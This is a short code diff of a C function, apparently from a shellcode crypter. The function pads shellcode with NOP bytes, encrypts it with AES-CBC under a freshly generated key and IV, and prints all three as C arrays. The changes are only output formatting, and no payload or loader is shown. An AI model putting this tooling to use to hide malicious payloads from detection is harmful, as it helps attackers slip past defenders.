@@ -37,7 +37,7 @@ static void encrypt(void)
     // seed random function
     srand(time(0));
 
-    // pad shellcode
+    // pad shellcode with nops: \x90
     int len = sizeof unpadded_shellcode;
     int padding = 8 - (len % 8);
     int new_len = len + padding;
@@ -45,33 +45,37 @@ static void encrypt(void)
     for (int x = 0; x < new_len; x++ )
         shellcode[x] = (x >= len) ? 0x90 : unpadded_shellcode[x];
 
+
     printf("Padded Shellcode:\n");
     for (int x = 0; x < new_len; x++)
         printf("\\x%02x", shellcode[x]);
 
-    printf("\n\n// Generating Key:\nuint8_t key[] = { ");
+    printf("\n\n// Generating Key:");
+    printf("\nuint8_t key[] = { ");
     for (int x = 0; x < 32; x++) {
         int b = rand_byte();
         printf("0x%02x, ", b);
         key[x] = b;
     }
+    printf("};\n\n");
 
-    printf("};\n\n// Generating IV:\nuint8_t iv[]  = { ");
+    printf("// Generating IV:\n");
+    printf("uint8_t iv[]  = { ");
     for (int x = 0; x < 16; x++) {
         int b = rand_byte();
         printf("0x%02x, ", b);
         iv[x] = b;
     }
+    printf("};\n\n");
 
     struct AES_ctx ctx;
     AES_init_ctx_iv(&ctx, key, iv);
     AES_CBC_encrypt_buffer(&ctx, shellcode, sizeof(shellcode));
     
-    printf("};\n\n// Encrypted Shellcode:\nuint8_t shellcode[] = { ");
+    printf("// Encrypted Shellcode:\n");
+    printf("uint8_t shellcode[] = { ");
     for (i = 0; i < sizeof shellcode; i ++)
         printf("0x%02x, ", shellcode[i]);
-    
-
     printf("};\n");
 }
 
